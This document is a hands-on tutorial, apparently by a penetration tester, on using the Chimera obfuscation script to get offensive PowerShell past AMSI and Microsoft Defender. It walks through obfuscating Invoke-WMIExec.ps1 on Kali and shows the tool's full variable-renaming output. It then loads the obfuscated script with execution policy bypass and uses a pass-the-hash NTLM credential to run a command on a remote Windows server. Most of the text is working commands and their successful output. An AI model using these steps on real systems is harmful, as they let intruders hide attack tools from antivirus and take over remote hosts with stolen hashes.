=========================================================================================================================================================
Simple AV bypass using the PowerShell obfuscation script 'Chimera'
=========================================================================================================================================================

Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions.

=> Source: https://github.com/tokyoneon/Chimera

The objective is to use 'Chimera.sh' to obfuscate offensive powershell scripts to be able to copy them on the disk of a target Windows laptop or Windows server   
and then run them without being detected and deleted by the Microsoft Defender AV (or other AV products)


=========================================================================================================================================================
PoC - Example with the script 'Invoke-WMIExec.ps1' running on a Windows 10 laptop (fully patched with Defender AV enabled and up-to-date)
=========================================================================================================================================================

Step 1 - Obfuscate the script 'Invoke-WMIExec.ps1' with Chimera.sh on a Kali VM
----------------------------------------------------------------------------------

Source: https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1

jeff@kali:~/Documents/Tools/Chimera$ ./Chimera.sh -f shells/Invoke-WMIExec.ps1 -l 4 -v -o /tmp/chimera-Invoke-WMI3x3c.ps1

 _____________________________________________________

  ░░░░░░ ░░   ░░ ░░ ░░░    ░░░ ░░░░░░░ ░░░░░░   ░░░░░
 ▒▒      ▒▒   ▒▒ ▒▒ ▒▒▒▒  ▒▒▒▒ ▒▒      ▒▒   ▒▒ ▒▒   ▒▒
 ▓▓      ▓▓▓▓▓▓▓ ▓▓ ▓▓ ▓▓▓▓ ▓▓ ▓▓▓▓▓   ▓▓▓▓▓▓  ▓▓▓▓▓▓▓
 ██      ██   ██ ██ ██  ██  ██ ██      ██   ██ ██   ██
  ██████ ██   ██ ██ ██      ██ ███████ ██   ██ ██   ██
 _____________________________________________________

 ░ by @tokyoneon_

 ░ Starting chimera with level: 4

 ░ Variable Substitution 

  ░ Detected: 196 variables 

   ░ $xXLOfbujriPPfosdbqZjLFZqUoUHcySWZOSSXMVJ ... '$server_challenge_and_security_blob_bytes' 
   ░ $AAYheRhoprXdwOVFwIrMQhNOmoiJMhNTTXYAzOET ... '$packet_DCOM_remote_create_instance' 
   ░ $aXYQgGWGXhCtxTnwPZMpZeHpWgiclMBSeHqtidXj ... '$packet_DCOMRemoteCreateInstance' 
   ░ $htjxkbDYwUTBlPFqhPkKlvKWdBBeWDELEjMNXOTo ... '$WMI_client_random_port_stream' 
   ░ $auhPYZtafPKFmQbLSwTmzhFjdYpoOyuaPloLBAki ... '$packet_DCOMRemQueryInterface' 
   ░ $DzxBhFbotsyXnUQmGLvmeJTysuxfrQwNpJORbFZJ ... '$request_split_index_tracker' 
   ░ $tseDDQMeaUxELdBMDHZsLAzcpeYbfZruBudyQDYJ ... '$DCOM_remote_create_instance' 
   ░ $euTLOSGHOKftXZMwxZjDVqgsLBVnkpeWHnzODRnQ ... '$packet_rem_query_interface' 
   ░ $iPMwOWDusxYCqGgFWkFVYymwgWJjbsXEZPSktqIU ... '$WMI_random_port_end_index' 
   ░ $SnUokqPrhcdkndFSaaatjOOwPKoZfJxNRudGXQEW ... '$username_and_target_bytes' 
    ░ skipping                                     '$sequence_number_counter++' 
   ░ $ibvwITLULyZagJjgzqFgFKElSVGSLSpiMlBOnnSJ ... '$request_split_stage_final' 
   ░ $EJBhjENyrdfFTMgecjMDIUGVJNLmejSbQpqJxiaI ... '$packet_property_data_size' 
   ░ $inycnxbUBLNeupNFTmNpCtnlPyCUojpJqwZBCZga ... '$packet_ordered_dictionary' 
   ░ $PIPSxILvaKCgqNcjnIbcaImNgktmiSAflrzGwdax ... '$alter_context_context_ID' 
   ░ $rMLrjspKTkdHeYJRZYBIVWVEIvgIzTEnKghAEqTg ... '$WMI_NTLMSSP_bytes_index' 
   ░ $AJBEvUKmEyFRrnAUKhVrwAtvcZqpLnxGMIhtmTBR ... '$sequence_number_counter' 
   ░ $UNIdnnUTdIpgZAPvJtHhRaHanbJWVPomRdGJVtbx ... '$packet_NTLMSSP_verifier' 
   ░ $JpQzohQXpHWITseFCuvEBdLztVrySfsoFgfEOLBO ... '$packet_full_auth_length' 
   ░ $dalvlNCqAIEJOMgmMpDEeeNhYOueKTRTrFruAqqN ... '$client_signing_constant' 
   ░ $CJRbfWmDsoVRPgbKfWoLYChzybmJsjBpFLPjZcaA ... '$WMI_session_key_offset' 
   ░ $xVzYdHaPvQeVZqNOyDivbmxShRmNpoaekfXMKwLG ... '$WMI_session_key_length' 
   ░ $EzUZECJzcnZqmapaQQRcNKFrJmleBWFmxlKhjJpm ... '$WMI_client_stream_init' 
   ░ $hlSJyGXBOUvfPZPJcuXXCSvpeCqCAgAdGuGKnoPQ ... '$WMI_client_random_port' 
   ░ $qSDISiXEjWmryalNyrRzBVbHHyCKzwhRsEkHlpBS ... '$packet_sequence_number' 
   ░ $JZJwwlysGumKNgizHRVYeYCUvJCwTsPKaFaUGVkL ... '$packet_RPCAlterContext' 
   ░ $KmxOTsiPWyoZituTsixTGjhmWMmKsaXkcFpMdPgn ... '$packet_NTLMSSPVerifier' 
   ░ $BxxjGmJjPlRHqUCjsgpKswTZzBSUCOKJQOEldJes ... '$packet_auth_pad_length' 
   ░ $AKKjcnArQzrajCuhizszqLbwdwoRYxRaLUXAuZIp ... '$NTLMv2_response_length' 
   ░ $FtdrBBvGjoPbeLwrALoWiLLPgfeHPQRNaJYIGheo ... '$client_challenge_bytes' 
   ░ $uvLlkmHuLjeYcWezyesVqtmJfuhQebpQajzNComD ... '$WMI_target_time_bytes' 
   ░ $SmPBIysFbAtwmpZjZsgEBjkavNtdnGKxJSEqJJxw ... '$WMI_namespace_unicode' 
   ░ $wJNcgPQbmXUonYFAEFQXhLDWxjqYHdffaJZtTvfB ... '$WMI_client_stage_next' 
    ░ skipping                                     '$request_split_stage++' 
   ░ $ShwDmePCoWPgImeAjimMiMdCAyBCPaoHpwvwniQD ... '$packet_target_unicode' 
   ░ $BZSKwbljhPdPFWTxolFErXnIHThlmeuVVjYEoKlf ... '$packet_service_length' 
   ░ $osxCfAGTjCUrDDhIILNjdFfKFTGGMkNlDYiGBZzx ... '$packet_private_header' 
   ░ $dbNZAvUCbyZKuBXesImfVjdjveoZvRBEvRAorwSW ... '$packet_NTLMSSP_length' 
   ░ $fkoPbSDQsZwBkJUqrvkyKqaKunuNrJLzGWWumFpm ... '$packet_interface_UUID' 
   ░ $UfCKbDeRihCONxyGYNvOUtQMBywUezmlxJiMlSpv ... '$packet_DCOMRemRelease' 
   ░ $hxgLCbRgZCJGhrroEGJnbJJrFnXCXDWZghTZEFzk ... '$command_padding_check' 
   ░ $JXpvVmqKMfeHljgCiGcMLvpsHOfeGCQwUDDWGWmD ... '$alter_context_call_ID' 
   ░ $JJhIIRqCcgEZqqnfeCAdhokEsZZqmCfrlxCojxPa ... '$WMI_namespace_length' 
   ░ $iDZCnurXdPMJSXhNPqYOVqBppYykryYKABmAQvHi ... '$WMI_hostname_unicode' 
   ░ $zhJEcEQFPqJsnDGMzuJECpFtGemNkrTULcHnjpjN ... '$request_auth_padding' 
   ░ $UaFSkshzIfBkKHZESydAQpWGOtWzVLtmOVGJGjCJ ... '$packet_target_length' 
   ░ $jvvVvhZHYkYUDMZgJuUPCkYwLEfByEUhmdvSnsMr ... '$packet_num_ctx_items' 
   ░ $ukXgOkmTnhgtjhVvxSHEsqbNjnmKwBSSVLcbmgQE ... '$packet_call_ID_bytes' 
   ░ $LSXHdurCcvjrBNRATPaKMDPKARnuWQPZzzJyacLu ... '$auth_username_offset' 
   ░ $XCYTOrmIKsaUKOukujdWztQnboVlbyoSzwBiIXNf ... '$auth_username_length' 
   ░ $NnvmBbqsjDkYythcOOUOJejZflHoDdfIpQmKHlLA ... '$auth_hostname_offset' 
   ░ $pPXtixHDememNVFkyYZZbUuObFqyaNslpTvCWDRi ... '$auth_hostname_length' 
   ░ $xZrouMODNGQUUVOJyXLnMBvRBKDyXeegCfBMwhxe ... '$WMI_random_port_int' 
   ░ $KvsuDWRQDhMkDKOLWRTgVEqzRcIYmWyhQOiDauHO ... '$WMI_negotiate_flags' 
   ░ $QsKGAIeiYSsAogLAgHrrPWfiMbPJkNzacfFWiPpr ... '$username_and_target' 
   ░ $ibhFiyVkFnGAdOhjctBmTiKlduRwUrmPLcMsqkLu ... '$unused_buffer_bytes' 
   ░ $icdNSAdGKMZIhyCBiGhWELvBUxFznaekdwrUwUQY ... '$target_address_list' 
   ░ $mQLJspLUVaMPtmCASeoqlTePEAUmIrcaVqMVXPQj ... '$security_blob_bytes' 
   ░ $OGkhrXkiEfroHLSMJwdqcMIUwySjxBMdXkLOEADl ... '$request_split_stage' 
   ░ $ZFQJmXRvPKfGdaoCUQzGJzUmPRLxZHFGSqQWOcfr ... '$request_split_index' 
   ░ $iFENUEkJZxvJzwxyZLZnAZfuDkuSkuAyawazPSUC ... '$rem_query_interface' 
   ░ $TXwwwfJcPPxHAyjecyNFfAEhOTNKafTakEoBWwTo ... '$packet_write_length' 
   ░ $HCQpBqkbkKOENAEiXHrozrYNzncxqlfQHTUTOjDo ... '$packet_UUID_version' 
   ░ $mYrHShQwUFfTxWXBPKzDVOiKDuOfHgYpJlCjgfsY ... '$packet_causality_ID' 
   ░ $DzGxjJrFKRXXCQdMcVqaaAcwpzeEVLYGgebQMeMW ... '$packet_auth_padding' 
   ░ $iTVAcomPTapnboqcuGugXehPbYMODaLqOjcGQFkk ... '$auth_username_bytes' 
   ░ $JffDBtAXuVrPUyKDDpNFitsxIpHhBPQbTUYnPIXH ... '$auth_hostname_bytes' 
   ░ $MoionDIleRxITamdtZqwWFlbavgMHPXZRLTJqYhR ... '$WMI_target_details' 
   ░ $zGjagvgomLbxOOKzKMaYwufxCkANmOqsswOTyrYG ... '$WMI_NTLM_challenge' 
   ░ $MDOOjaixumtwsUyKDeWqiAqFzwdBUiVnJxdPbOWU ... '$WMI_hostname_index' 
   ░ $IHgbNrxXUtHHiavoEQbTUVerteoXxvYhLLmVFpOB ... '$WMI_client_receive' 
   ░ $SmCyRyWvmwvqTzZwSZykyLEEWKMRShvTHkhKFtJI ... '$target_short_index' 
   ░ $IjAyIMcyENOwwovfmdWZaZEcKUrsWceZozucowFj ... '$target_bytes_index' 
   ░ $zbAeJdLMwjeyeqASIbScOHeGErsoFprLInsCyMYj ... '$request_context_ID' 
   ░ $CaCkNTfUpSazjzFXtPtNVRxEXNDDgJQbolXBTgvt ... '$packet_rem_release' 
   ░ $jJElBLmOfbOLQwJnBArLpEjMFTKEgDiGhMQDQPQU ... '$packet_frag_length' 
   ░ $xkODiNuxohoHsSNEtlrhxMrxJNCzOnIHnjPfxNRb ... '$packet_auth_length' 
   ░ $roVbKUEaRGAonCIVTaDeDxgErhedwCEldcZSmtsc ... '$packet_assoc_group' 
   ░ $dHrDyApEDRotATgxDHoyXlrwKPWUxCJQGdvHnHod ... '$client_signing_key' 
   ░ $wRCxDCjVdVLxCtvCaljIhIfkTnnYbbONHKzRpRNF ... '$causality_ID_bytes' 
   ░ $bbTWxDUCDDZDwXXSTOHmauzMoZrNIQEYNPvrUYCH ... '$auth_domain_offset' 
   ░ $txQMyRlwmYWzgfPgirBRWOKpMeNwLDOcmsAwvJVx ... '$auth_domain_length' 
   ░ $avsFWkPJoKZXrFgAESjzMQHcfGMKwDFRLDhKIohr ... '$alter_context_UUID' 
   ░ $qLZXJeFadNKJJxAwdzGOrxYMVJPFgEWYjcGuZQoB ... '$WMI_target_length' 
   ░ $ETMDxcIHsFBTOnIaJecFpWcUCyjwOawvIvkTKmoL ... '$WMI_NTLMSSP_index' 
   ░ $EqAMltCFmGBSPkQLilTxIkbTVrfiLyrLfMsyFuEK ... '$WMI_domain_length' 
   ░ $lvjHhcfrcXLTzIccKgDvPFploVchLJJaMlmmaTQb ... '$WMI_client_stream' 
   ░ $ZNIOlQBYNuGgOReanhxgRChPSMBYBsQBtenDlmBW ... '$target_process_ID' 
   ░ $AxJBnKndaItXknVTRnAHTkesxrebwrFXojenUzCw ... '$packet_total_size' 
   ░ $XbfsuVdGYFfJgaaFehXyTcjlbncjzNSDDcorQjQU ... '$packet_RPCRequest' 
   ░ $TWpSimAitFzyCyKRjnuhhfncImswOeJeZUUTkPIg ... '$packet_RPC_length' 
   ░ $vMWCtOcPXnOJBjPvFONApeFOgAivficOoPteahmA ... '$packet_context_ID' 
   ░ $SQflVZmDvNhRwiflANxqigvrFnbYEzmRGoferctc ... '$packet_auth_level' 
   ░ $vFFFbOTTnbDLMRRdZtWNrsEBxEreDLkdvXvTIkCl ... '$packet_alloc_hint' 
   ░ $TeOXkyoXOsCYkLFKJRvsJjvFdsORHiPMIYHAKRBi ... '$auth_domain_bytes' 
   ░ $HjkLiIqxUyOYdmYoVuMFqzkkzuymkJwBEWPJuUzA ... '$WMI_client_stage' 
   ░ $NftEeudQOaAdOOJrEqkDOaiIlOzNtEKhIfcKSqCo ... '$session_base_key' 
   ░ $aVNTQzrXPKVtmpqGETKRKXBHljmDJfljJFoeLhxX ... '$process_ID_bytes' 
   ░ $ZAVXLIDPYciMuotddKstSXhrvXYkwzoCqkchZWKd ... '$OXID_bytes_index' 
   ░ $HVvADljdHfgVetViJFJpPumalTfcbIcWDWZMzztj ... '$NTLMSSP_verifier' 
   ░ $gCcQfdRHuXPEvNVadBTNratFESAjPKebtrobFgjP ... '$NTLMSSP_response' 
   ░ $hsyHWmrTzZMzUfwbMoZQkFZcCyNETEfpRyfAQwqz ... '$MEOW_bytes_index' 
   ░ $DBFxtetVcsIsrzMwrXfMeoCsNPwJpzZpOftXLCNR ... '$client_challenge' 
   ░ $ZFRNoUJzOHJiixZcTQTzcPeEWODgusWPJhFbPIOL ... '$auth_NTLM_offset' 
   ░ $eINWVLdjyhbwpipaQRrGMRcmXodiuUIwWDAuItOc ... '$WMI_random_port' 
   ░ $OzfDvahBHmzrqptlHVZFTNXRdHGGuZYHIBssovkR ... '$WMI_client_send' 
   ░ $ZPxgnRfpVzqYLovSfSBHhUdqvcESZOtwVhivwELf ... '$WMI_client_init' 
   ░ $lOLkKfNLsrMlraMIuajRSeGAWdWpfBfiAaCUeOdL ... '$sequence_number' 
   ░ $NvQfqdYKRWgwjNnABWRvdQlaIMBhVAngvmUWxWrb ... '$request_call_ID' 
   ░ $zmyedmhKVdJgcxuYdkkdaEBvVAseZaPSuLHoebQp ... '$packet_RPCAuth3' 
   ░ $rIDOirspLvjztlzZOfBCfkEMevLEeFkjPoMmQdBU ... '$packet_max_frag' 
   ░ $KybKqEZKpiCjhWVHritAaQJoLwyKurFQDJHYPFEJ ... '$output_username' 
   ░ $jTtgevfMyICDPmvwPvWpnPSUxGpzfrdZsUuYvpTg ... '$NTLMv2_response' 
   ░ $vYfUVxrPzQLahxPDMIRjeobJpcnUDpUsBDeMGjZk ... '$NTLM_hash_bytes' 
   ░ $eBDArMrdQuABrufIBnjCmKBaXyhpDqrbdiWHrkVB ... '$hostname_length' 
   ░ $BxpmpHnbOFZOuKsMlSVYlvMPPKvdYmWqaCoiNLkR ... '$command_length2' 
   ░ $cHvfEnOBWmrNwkfPrzTTnIgfgHcLXPbtXsCLiNlz ... '$WMI_session_ID' 
   ░ $DonYBXpWylMoUeqgnKcGpPHzwrTNhYrVUELbzssl ... '$target_unicode' 
   ░ $dGAIzotUlyCwHeyiYWApHpgfpZgomzHNRvYlmLFy ... '$request_length' 
   ░ $bLzCEtQRLUnJtAhfnIKQvaoqTJPKBYjFAPHCbfet ... '$packet_RPCBind' 
   ░ $cegsUAEKltuKHoKpnvafdChXyUyOgdWuRpIfuPmj ... '$packet_NTLMSSP' 
   ░ $HQBvVYIBXhRPYBGWmXflUvgbAYebBnhufFrrFREW ... '$packet_cntdata' 
   ░ $TFBqyQUdOkmLHktBKvjBOafIoHBzvFjuriYxRNph ... '$packet_call_ID' 
   ░ $CplkbYPRwmvCZrCNumCSByIBBDLDHUtpQLnGjuxT ... '$command_length' 
   ░ $VQJWYVcRCRHupVUKLGbqASXpTkFTPZqWhQrRyFUY ... '$auth_LM_offset' 
   ░ $yAUZeaaKwJDprbQXaxOPsXccxFjXoTvnWwZWdFnt ... '$unused_buffer' 
   ░ $WFxaPnllGkINHDrPydBWPDJgzFzGNVQpZBZqdCdk ... '$target_search' 
   ░ $sNEQiZorZXVajrtttEDwjJGZCSfQgsyXOCqkjSHc ... '$RPC_signature' 
   ░ $BBHRdDWpkvCwlmpeqwmPSQHesGCjYnkUtbIWROAz ... '$request_split' 
   ░ $HDmtORetyxoDNbZTTkZJwTOqXUwNPXqPLBVCPHzb ... '$request_opnum' 
   ░ $FDXdlRHZbhcIXTYpsYnGtRzXKcGERwlZIduqXGaO ... '$request_flags' 
   ░ $uHAOoeEaXKpmKDaXCIvaNUPJUOYVLkIEYojWeyvh ... '$packet_target' 
   ░ $vOVOlDaGBumBpteMuCMhLiqpELDncKQknwpLZbAe ... '$command_bytes' 
   ░ $KgVwUNjdvEBfgfKWmVDQjazywzHWixdeVFusLNix ... '$auth_hostname' 
   ░ $MNxvTOlPwJxILLIISBMrjlQyITBMOCWFRWAZpxuc ... '$WMI_hostname' 
   ░ $gniaiBnDrLAtnJzCHwRGUGTnOwIUyAvuvuWVmGOX ... '$target_short' 
   ░ $vwwpmxBqYjqkfYGYTlyLOeOYknNQJtBKSQzbenDD ... '$target_index' 
   ░ $rTXUkrltfVrlNPMboQELZkAsBMMgDiqUBqocqmzH ... '$stub_length3' 
   ░ $uLQYiMxMliACsWICNjwMPPhwIbeYYwCfDbZZudDk ... '$stub_length2' 
   ░ $lKBfRqzhEtyxupBJLqEBENgdvaPCawbsKQNNnnzl ... '$request_UUID' 
   ░ $NAvDXHlibeMsHHkzgDMeWDYIHoxqxEnENrbyvmPr ... '$packet_opnum' 
   ░ $MzoIuurXCaizltaJgFTIQzaSAmezoQRWZeGgIBhp ... '$packet_IPID2' 
   ░ $lHhOvXsSlAfYCqUDBjNreSxoxiyhCuuXCDDdxJmC ... '$packet_flags' 
   ░ $tzYqBAFcByqNVhePTVHDNduXmbJqIRmaITcMbGVv ... '$object_UUID2' 
   ░ $uafTFyHpDMbpzdMlwofSQwdbiLeqnDJIGdxzoZkp ... '$causality_ID' 
   ░ $YrXwIXAyHGZuwuglfjrsDBFyCxrHuZbneLzgOXAG ... '$WMI_NTLMSSP' 
   ░ $BvVvcmqrTLAFlsCTtKutRmiOkwrUctjfncugSghQ ... '$WMI_message' 
   ░ $ZSmuzmPvozYnulqmakqulZCxnLFrzDePOXlWeuLa ... '$WMI_execute' 
   ░ $UycCpGhrxCgpTgMwxQezlInOyRcJBzpnqRXEazKl ... '$target_type' 
   ░ $TpwRtXxImkTVqWFqRtkUVtJJnlFPzHYtgBGxiGzm ... '$target_long' 
   ░ $oZxecMYqicpGeuzqlkSnhKCXgaEFbLXbQNhzGqvf ... '$stub_length' 
   ░ $NcZRnnFYdwiYFIGNhapSDtfnzMGvJtTDJvAWpeVt ... '$packet_UUID' 
   ░ $fbTjfWsCyXAkRXABcbTQSOGzaCPnEWdIupBKIFoB ... '$packet_size' 
   ░ $nLOoFmeWTYsQhzidhQiZUmSwWhkTRRAbsVPqChQc ... '$packet_IPID' 
   ░ $NupktgNwHWRHFgTXcvfAspNEqOhUMjwpgtdUaZvY ... '$packet_data' 
   ░ $MkzkGiUKnTrUUwYyaGJDGscqumbeHoBSAERpUpnc ... '$object_UUID' 
   ░ $xVBJxVLKGYZBHAsCyYVECfgPkttgKpltMOLJXzXk ... '$NTLMv2_hash' 
   ░ $ctOwtmKJHLFtQtDLDYHvDeVfSmnPULhygHmonSJc ... '$data_length' 
   ░ $gnIJncOUGzZmNtcUQwICreKSzWqQZmrMkrXwNTqr ... '$auth_domain' 
   ░ $xrlGCQNEQucAmBLHwwvamsXGStRSUXaKKlKORxGf ... '$assoc_group' 
   ░ $DidhfGtlNTotSSwMsoVtHoixtxoDYbWjCtaQAfvE ... '$WMI_client' 
   ░ $IDfVlUaxwXNYocVVSrGMaDBkPLkYVWAnaeadFiOk ... '$process_ID' 
   ░ $UwgTglAqEhXSsnMkHvTDguvAUYWziygXeBiHIcOP ... '$packet_RPC' 
   ░ $qRdkEUZrHFSdcGXpSZBzEaKzAzCHbCvayvuSigVp ... '$packet_IID' 
   ░ $caChcUjrCtKnFWcoafSXxvMwheoFZjIghmdOzMRU ... '$OXID_index' 
   ░ $dLXtsgxAWAJmaZqeEQuggigjxQsKVVRzInZBjthW ... '$MEOW_index' 
   ░ $piRoCvWQWefjUetONwQfUcjUBLIOGrFHFpwddCam ... '$IP_address' 
    ░ skipping                                     '$error_code' 
   ░ $zAingqonQZVRfRsevcCTezBiUXsRMavIDIRXANYZ ... '$byte_array' 
   ░ $eCclXJTseegBDseBOPNRkAmWEqKmOvtAQsdWvwuz ... '$Stub_data' 
   ░ $KebiacSnqJpAkNYKklXxJMPfMvbTtZiDAleUQIzV ... '$stub_data' 
   ░ $BbFJqvumHYRSyAOFhGItORkSaeYBNepOvHsDyrQU ... '$WMI_data' 
   ░ $xdpQMThaxSroFgBKLlpnGFHTTXtCugKAVeKOIYlR ... '$Username' 
   ░ $bwaMiAJgaPvrHxenqilzljkYDMStQzvAcCeecSXf ... '$username' 
   ░ $MGaatEBwTYjoBeopoizUepVKRGJSyXSLmmWfFObS ... '$RPC_UUID' 
   ░ $fULqLRvPcivUWFvPBerKKiIURKYQUXggjvjkPPYD ... '$HMAC_MD5' 
   ░ $XSMxbzNlekhvcQVSYPoqFiBmXFHkyEXdIKBOVxmR ... '$Command' 
   ░ $NjJDuouXDsnFaclzOctlnjdulYDUrQreujGIPXym ... '$Target' 
   ░ $RJlVtVkaaSGYeBATauyyuXEYvGgUrQsFHqHOXkBE ... '$Domain' 
   ░ $UQyUMVQsmCDiVmUEhYIlUCHMVqOKNNdhXsFJrZKz ... '$Start' 
   ░ $oFZfkOJZghzqLkTjVyvEqnsOQSgnTIAgILSJvjpS ... '$Sleep' 
   ░ $VxjwhKkPzGEQBdBFjdNVnKXYxsLSchaKQbzXlJvO ... '$IPID2' 
   ░ $EhtQXGKkAjlabGrczZhEtuqqQyLeUrmsUIMkTxdW ... '$field' 
    ░ skipping                                     '$false' 
    ░ skipping                                     '$true' 
   ░ $EdIKraywGBbueqXJgQHFcYjGxaEBsrrSWAAUMAxx ... '$OXID' 
    ░ skipping                                     '$null' 
   ░ $XwRXWaBhTnPGIFHoHmAUXRhZIKzHnJIuqeZzYQJN ... '$MEOW' 
   ░ $iuzbcOUerovFGDTewsxFKHXlggBKJLsUWETljOcH ... '$IPID' 
   ░ $MzEZDGEKejBbkVFZXJrgEYAiipaWnfMVHwIEOmej ... '$Hash' 
   ░ $cmlTADPVNeCsfEPNkYlsDJbQyazEPOvrbRVmuxSx ... '$hash' 
   ░ $wfBqvANYCXhUdrVylywdsjqkIannFhbDvHZdwQtp ... '$Data' 
   ░ $ZhBrdYeCDAJLTMuVRjyiohrEWlVbHGdHxUOkKOcq ... '$RPC' 
   ░ $ljMiRXTsSgqigoWHsTwaOnOAcPQTTAJjNMkwKHnQ ... '$MD5' 
   ░ $wuhAsWFMcrCkjKkRQpiQYFCbRbVVFsLHtsqPcCAJ ... '$i' 
    ░ skipping                                     '$_' 

 ░ Obfuscated file: /tmp/chimera-Invoke-WMI3x3c.ps1 



=> I scanned the file generated (chimera-Invoke-WMI3x3c.ps1) with the Microsoft Defender antivirus and it was not detected.


Step 2 - Check that the obfuscated 'Invoke-WMIExec.ps1' is working properly without being detected by the AMSI / Defender AV
-----------------------------------------------------------------------------------------------------------------------------

C:\Users\Administrator\Documents\Tools-AD>powershell -exec bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Administrator.PO718687\Documents\Tools-AD> . .\chimera-Invoke-WMI3x3c.ps1

PS C:\Users\Administrator.PO718687\Documents\Tools-AD> Invoke-WMIExec -OpTOitJXLInfvfUGRukOjzjCnvYOItKHVjpEJcvMWrURMVgogWnJDeFwrXpGtoALpwBRbbeDkJJMfEBBdEuWejDSfjtSiefpybuGJjdNZquJCapQWhQzNRTpeqSNkwPbszVUuUtnQzLbugOWOOzpPGhuiVMOiBLUrXioMYfXFvaOlidXYjwMxAlDULaetfimaNVpueXCWMjXbEriUkgnUzhVpXxEcsTUbjZpzXTZvUqDddFKwvAVNHtMDMIijymiSfPZAOVSWRMrADneVfhUwbhjqIGTexQPQQvPZ 192.168.1.51 
-kcYfatHpXuZxTvlsOwXOSxLCzAmuusaDtpkzGTuVZzWbKYFzaOaPHrXwjwZTTampVlytxxxnkxLKSBNGNqXlLyokpFrHozktfkOMAAQbrcqNjStotmzxOLbmjWOQLdqSKPTlOeMZScQgSTfvPPvgIrAItPUcjqwPIvwreDxhuVIMRlbdkWHCLzeTQHqdcESNTSmzuFtLTngApswMdpUpIlSjIUnJRWiHioiFxTvmMasEtNAUPlLYnhkKgVJsJkUARZTnUoxZdnwJBxmQQfiMs administrator 
-sRBcBxzUTJFcKjnJeSwScOTSTJyGiaNoGUNJDbwzExpfYXUIFnlVdKBMoaYpdtZrivHqUYZIIJvKrYMpaZSpvyDnQDHMRcVjMwjTZGkWIKfsJWBOeuzHvMfnoeSeUiUrkjrcuRSNPtcAXstQPkhhQNfkxHIxKfertnzGVDiFWPpSyPkkGXDoERMXEjpQgaXpKachuBDiSsyNqfcUbqRkITSKladkcsxLGbPYnpIlGjzgOoZqSgvmSiSPfubPhCPtq cf3a5525ee9414229e66279623ed5c58

[+] administrator accessed WMI on 192.168.1.51

=> The obfuscated script is working !


PS C:\Users\Administrator.PO718687\Documents\Tools-AD> Invoke-WMIExec -OpTOitJXLInfvfUGRukOjzjCnvYOItKHVjpEJcvMWrURMVgogWnJDeFwrXpGtoALpwBRbbeDkJJMfEBBdEuWejDSfjtSiefpybuGJjdNZquJCapQWhQzNRTpeqSNkwPbszVUuUtnQzLbugOWOOzpPGhuiVMOiBLUrXioMYfXFvaOlidXYjwMxAlDULaetfimaNVpueXCWMjXbEriUkgnUzhVpXxEcsTUbjZpzXTZvUqDddFKwvAVNHtMDMIijymiSfPZAOVSWRMrADneVfhUwbhjqIGTexQPQQvPZ 192.168.1.51 
-CTdwzKCSeSYcZIlioSobxhwugKpZbUCfpPnDOdEZcVXdcfYTpslnEQlPZxcaVtazIrSQezSCRpqSBBOzTMUExzuCDGInVXxgsvUoKKsIfGCGZDfDvxaeBQsBNwJKgJSeuLjDApzhKdBlAyGyGnuNNsyhfeoVbulsLgxKrINPkCCOsElJClFZBSeuviYHRfrPKVIjucawKkdOtMbBcsPfENHTdSaGNtyPfVnFHUIBGUDQAubuqujrnBafRSPvbLshEKtCjWYLbKmKQdbCBHDjgOLbXIkZtRkIDeQCsjRsxdTCefmd . 
-kcYfatHpXuZxTvlsOwXOSxLCzAmuusaDtpkzGTuVZzWbKYFzaOaPHrXwjwZTTampVlytxxxnkxLKSBNGNqXlLyokpFrHozktfkOMAAQbrcqNjStotmzxOLbmjWOQLdqSKPTlOeMZScQgSTfvPPvgIrAItPUcjqwPIvwreDxhuVIMRlbdkWHCLzeTQHqdcESNTSmzuFtLTngApswMdpUpIlSjIUnJRWiHioiFxTvmMasEtNAUPlLYnhkKgVJsJkUARZTnUoxZdnwJBxmQQfiMs administrator 
-sRBcBxzUTJFcKjnJeSwScOTSTJyGiaNoGUNJDbwzExpfYXUIFnlVdKBMoaYpdtZrivHqUYZIIJvKrYMpaZSpvyDnQDHMRcVjMwjTZGkWIKfsJWBOeuzHvMfnoeSeUiUrkjrcuRSNPtcAXstQPkhhQNfkxHIxKfertnzGVDiFWPpSyPkkGXDoERMXEjpQgaXpKachuBDiSsyNqfcUbqRkITSKladkcsxLGbPYnpIlGjzgOoZqSgvmSiSPfubPhCPtq cf3a5525ee9414229e66279623ed5c58 
-ICFeGvQrfhcOdQHtieOKLgPnUXMAPiAURyXrfQnuWwmwAAcFmMVdFLBTGNyMdShFMnrlurvJMYKagPtPgmbjcyjmwaksvdWgbtkzreniRIRkhnwmukTVsKaHpokaYCfQlddOpSZQbAQhfWjyCQVVcPUCfTjltGiSmtIPcLsdQZwmnjhUmXxCFHmeUkDhQEgOYxMnlRgOzWmrYtcCATOmRBfsfZwIrLqpjycCjRdxsipyRnlwwkSsSIfxIFOpewAHrhtZHxTvJcXtuchWNOerlJHMCjnouGFwGNDRFerJwinHPjINRlsegCoSacpYeTu "cmd /c echo pentest > C:\pentest.txt" -verbose
VERBOSE: Connecting to 192.168.1.51:135
VERBOSE: WMI reports target hostname as Oracleserver1
VERBOSE: [+] .\administrator accessed WMI on 192.168.1.51
VERBOSE: [*] Using Oracleserver1 for random port extraction
VERBOSE: [*] Connecting to 192.168.1.51:49666
VERBOSE: [*] Attempting command execution
<SNIP>
[+] Command executed with process ID 4392 on 192.168.1.51

Start-lYfBbUyBkspeXAIwaaeznMhNvFWxgxdGyZeaTudPkhLfIhLXnYcwyieKokhihrFEbNFfxhFgihKzFvwBjZOkHUGNkdaFPBatcajSTSsgAuHIXkJYPZfiCZZHGSxsxtTHAAoHlfUBsLSLonpdkASruTguHpSBeErLSwWaK
RmFCtdDqSHOgXtZccTPQGqwzRapVlzMoTkqQuxcOIvvhUbxMAHafedwaxWVcHUouUdrOvUaKRkNPwGYdBHzEiBALPOPKaxCxcAWdUYHBKbWAhlsgsUjmmBYFhbotJBQFZsTqlFvYBbtKGTbzcaR : The term 'Start-lYfBb
UyBkspeXAIwaaeznMhNvFWxgxdGyZeaTudPkhLfIhLXnYcwyieKokhihrFEbNFfxhFgihKzFvwBjZOkHUGNkdaFPBatcajSTSsgAuHIXkJYPZfiCZZHGSxsxtTHAAoHlfUBsLSLonpdkASruTguHpSBeErLSwWaKRmFCtdDqSHO
